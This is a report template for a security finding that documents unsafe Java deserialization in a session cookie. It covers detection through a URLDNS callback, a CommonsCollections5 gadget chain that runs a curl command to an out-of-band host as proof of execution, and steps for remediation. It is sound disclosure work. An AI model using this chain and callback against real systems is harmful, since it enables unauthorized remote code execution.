# Java Deserialization Finding — Report Template

```markdown
## Unsafe Java Deserialization: <cookie/endpoint> executes gadget chain

**Severity**: Critical (CVSS 9.8) / High if blind-with-side-effects only
**Asset**: Cookie `session` on https://target.example.com/
**Type**: CWE-502 Deserialization of Untrusted Data

### Surface identification

Session cookie value begins with `rO0AB` (Java serialization header,
base64). Application re-hydrates user profile object server-side.

### Detection (URLDNS, non-executing)

```
cookie = <URLDNS-serialized base64 pointing to d3t.oast.pro>
Interactsh: DNS A query d3t.oast.pro from egress 203.0.113.50 at T0
(evidence/oob_urldns.png)
```

### Execution proof (bounded)

CommonsCollections5 chain issuing single harmless outbound command:

```
curl http://d3t.oast.pro/poc-www-data
-> HTTP hit logged with path /poc-www-data, confirming command execution
as user www-data inside target runtime.
```
No files modified; no further commands run.

### Impact

Pre-auth RCE as service user. Library fingerprint from error oracle:
commons-collections 3.2.1 present.

### Remediation

1. Replace native Java serialization at trust boundary with JSON.
2. Apply JEP 290 serial filters allowlisting DTO packages only.
3. Remove/upgrade commons-collections to 4.x configured safely.
4. Rotate any secrets reachable in deserialized context (defensive).
```
